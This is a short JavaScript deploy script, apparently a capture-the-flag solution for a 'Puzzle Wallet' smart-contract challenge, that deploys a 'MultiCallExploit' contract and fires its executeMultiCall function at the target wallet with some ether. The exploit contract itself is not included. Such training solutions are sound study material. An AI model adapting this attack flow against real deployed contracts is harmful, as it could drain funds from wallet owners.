const path = require('path');
const addresses = require('../Addresses.json');

async function main() {
    const scriptName = path.basename(__filename, '.js');
    console.log('----------', scriptName, '----------');

    const accounts = await ethers.getSigners();
    const sender = accounts[0];

    const puzzleWalletAddress = addresses[scriptName];

    const MultiCallExploit = await ethers.getContractFactory('MultiCallExploit');
    const multiCallExploit = await MultiCallExploit.deploy();
    const contract = await multiCallExploit.deployed();

    console.log(contract)

    const txSolve = await contract.executeMultiCall(puzzleWalletAddress, {value: 1000000000000000, gasLimit: 3000000});

    console.log('----------End----------', txSolve.hash);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
